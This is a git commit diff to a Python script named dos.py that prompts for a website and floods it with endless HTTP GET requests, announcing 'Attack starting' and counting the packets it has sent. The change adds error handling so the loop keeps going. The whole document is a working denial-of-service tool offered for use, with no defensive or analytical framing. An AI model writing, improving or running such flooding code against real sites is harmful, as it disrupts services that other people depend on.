eb69866fec59085b7903720d95e6b589c3df98b5
IAmEatingAnApple <70452799+IAmEatingAnApple@users.noreply.github.com>
2020-10-08 12:47:34 +0300

    Add files via upload

--- dos.py
+++ dos.py
@@ -6,9 +6,13 @@ system("clear")
 site = input(Back.RED + Fore.BLACK + "Введите сайт: ")
 print(Style.RESET_ALL)
 i = 1
+print("Атака начинается...")
 while True:
-	response = requests.get(f"http://{site}").text
-	print(Fore.YELLOW + response)
-	print(Fore.GREEN + f"Пакет послан {i}")
-	print(Style.RESET_ALL)
-	i = i + 1
+	try:
+		response = requests.get(f"http://{site}").text
+		print(Fore.YELLOW + response)
+		print(Fore.GREEN + f"Пакет послан {i}")
+		print(Style.RESET_ALL)
+		i = i + 1
+	except ConnectionError:
+		print("Такого сайта нет")
